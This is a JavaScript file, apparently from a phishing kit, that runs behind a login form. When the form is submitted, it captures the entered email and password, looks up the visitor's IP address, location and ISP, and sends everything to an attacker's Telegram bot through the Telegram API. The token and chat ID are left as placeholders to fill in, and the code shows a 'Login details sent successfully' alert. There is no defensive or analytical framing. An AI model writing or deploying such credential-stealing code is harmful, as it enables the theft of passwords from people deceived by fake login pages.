document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('form');

    form.addEventListener('submit', function (event) {
        event.preventDefault(); // Prevents default form submission

        const usrId = document.getElementById('usr-id').value.trim();
        const password = document.getElementById('pwd').value.trim();

        if (!usrId || !password) {
            alert('Both email and password are required.');
            return;
        }

        // Fetch IP and location info
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const country = data.country_name;
                const city = data.city;
                const isp = data.org;

                const message = `🔹 New Login Attempt 🔹\n📧 Email: ${usrId}\n🔑 Password: ${password}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;

                // Replace with your actual bot token and chat ID
                const botToken = 'YOUR_BOT_TOKEN';
                const chatId = 'YOUR_CHAT_ID';
                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                const payload = {
                    chat_id: chatId,
                    text: message
                };

                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert('Login details sent successfully.');
                    } else {
                        alert('Error sending message to Telegram.');
                    }
                })
                .catch(error => {
                    console.error('Error sending message to Telegram:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP info:', error);
            });
    });
});
